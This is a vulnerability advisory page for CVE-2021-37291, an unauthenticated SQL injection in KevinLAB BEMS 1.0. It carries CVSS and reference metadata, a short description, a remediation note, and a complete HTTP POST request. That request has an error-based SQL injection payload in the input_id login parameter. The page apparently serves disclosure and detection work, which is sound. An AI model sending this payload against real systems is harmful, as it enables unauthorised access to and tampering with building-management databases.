---
layout: post
cve_id: CVE-2021-37291
title: KevinLAB BEMS 1.0 - SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-37291.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-37291.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: critical
impact: 'Unauthenticated attackers can exploit SQL injection in the input_id parameter
  to extract sensitive database contents, modify data, and execute unauthorized administrative
  operations.

  '
remediation: 'Upgrade to KevinLAB BEMS version 1.0.1 or later that addresses the SQL
  injection vulnerability.

  '
reference:
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5655.php
- https://www.exploit-db.com/exploits/50146
- https://packetstormsecurity.com/files/163572/
- https://nvd.nist.gov/vuln/detail/cve-2021-37291
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-37291
  epss-score: 0.60436
  epss-percentile: 0.98211
  cwe-id: CWE-89
  cpe: cpe:2.3:a:kevinlab:4st_l-bems:1.0.0:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: kevinlab
  product: 4st_l-bems
tags:
- cve
- cve2021
- kevinlab
- sqli
- edb
- packetstorm
- vkev
- vuln
---

## üîç Vulnerability Description
KevinLAB BEMS 1.0 contains a SQL injection vulnerability. Input passed through input_id POST parameter in /http/index.php is not properly sanitized before being returned to the user or used in SQL queries. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.


## üåê HTTP Request
```nohighlight
POST /http/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Connection: close
Content-Length: 353
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]
```

